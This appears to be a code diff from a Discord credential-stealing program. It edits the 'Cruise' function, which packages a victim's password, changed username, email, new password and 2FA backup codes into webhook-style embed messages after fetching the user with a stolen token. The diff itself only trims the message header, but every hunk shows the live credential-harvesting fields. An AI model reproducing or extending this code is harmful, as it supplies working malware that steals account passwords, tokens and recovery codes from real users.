@@ -607,7 +607,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "Password", value: `\`\`\`${password}\`\`\``, inline: true },
@@ -628,7 +628,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "New Username", value: `\`\`\`${request.username}\`\`\``, inline: false },
@@ -643,7 +643,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "New Email", value: `\`\`\`${email}\`\`\``, inline: false },
@@ -657,7 +657,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "New Password", value: `\`\`\`${request.new_password}\`\`\``, inline: false, },
@@ -675,7 +675,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             const codes = await getBackupCodes(response);
 
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
@@ -699,7 +699,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
@@ -719,7 +719,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
@@ -732,7 +732,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             API = new Fetcher(token);
             user = await API.User();
             content = {
-                content: `**${user.username}** ${action}!`,
+                content: `${user.username}`,
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`\`\`${email}\`\`\``, inline: true },
